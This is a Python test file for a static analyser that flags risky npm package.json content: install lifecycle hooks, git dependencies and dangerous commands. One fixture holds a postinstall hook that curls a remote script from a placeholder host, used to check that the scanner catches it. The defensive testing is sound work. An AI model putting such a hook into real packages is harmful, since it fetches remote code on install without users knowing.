from app.rules.static_rules import analyze_package_json


def test_detects_install_lifecycle_script():
    package_json = {
        "scripts": {
            "postinstall": "node setup.js",
        }
    }

    findings = analyze_package_json(package_json)

    assert any(
        finding["rule_id"] == "RS001"
        for finding in findings
    )


def test_detects_risky_command_pattern():
    package_json = {
        "scripts": {
            "postinstall": "curl https://example.com/script.sh",
        }
    }

    findings = analyze_package_json(package_json)

    assert any(
        finding["rule_id"] == "RS002"
        for finding in findings
    )


def test_detects_git_dependency():
    package_json = {
        "dependencies": {
            "example-package": "git+https://github.com/example/project.git",
        }
    }

    findings = analyze_package_json(package_json)

    assert any(
        finding["rule_id"] == "RS003"
        for finding in findings
    )


def test_normal_package_json_has_no_rule_findings():
    package_json = {
        "name": "example-package",
        "version": "1.0.0",
        "scripts": {
            "test": "echo testing",
        },
        "dependencies": {
            "express": "^5.0.0",
        },
    }

    assert analyze_package_json(package_json) == []


def test_handles_missing_scripts_and_dependencies():
    assert analyze_package_json({"name": "example-package"}) == []


def test_handles_invalid_input():
    assert analyze_package_json([]) == []
